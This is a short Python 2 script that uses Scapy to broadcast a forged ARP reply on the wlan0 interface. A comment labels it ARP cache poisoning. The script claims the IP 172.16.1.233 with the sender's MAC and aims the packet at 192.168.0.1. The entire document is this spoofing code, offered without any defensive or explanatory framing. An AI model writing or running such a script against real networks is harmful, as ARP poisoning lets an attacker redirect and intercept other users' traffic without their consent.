#!/usr/bin/env python

#Importing the logging module
import logging

#This will suppress all messages that have a lower level of seriousness than error messages.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)

#Importing Scapy and handling the ImportError exception
try:
    from scapy.all import *

except ImportError:
    print "Scapy package for Python is not installed on your system."
    print "Get it from https://pypi.python.org/pypi/scapy and try again."
    sys.exit()

#Defining the destination (broadcast) MAC address
target = 'ff:ff:ff:ff:ff:ff'

#ARP cache poisoning
send(ARP(hwsrc = get_if_hwaddr("wlan0"), psrc = '172.16.1.233', hwdst = target, pdst = '192.168.0.1'), iface = "wlan0")
